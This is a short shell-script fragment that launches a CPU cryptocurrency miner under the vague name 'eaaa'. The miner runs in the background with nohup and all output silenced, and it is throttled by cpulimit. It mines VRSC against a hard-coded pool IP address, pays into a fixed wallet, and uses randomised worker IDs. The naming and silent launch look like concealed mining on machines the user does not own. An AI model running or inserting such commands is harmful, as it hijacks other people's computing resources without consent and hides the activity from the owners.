...
sudo cpulimit --background -e eaaa -l 400
nohup ./eaaa --algorithm yespoweric --pool stratum+ssl://103.249.70.7:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 6 --disable-gpu &> /dev/null &
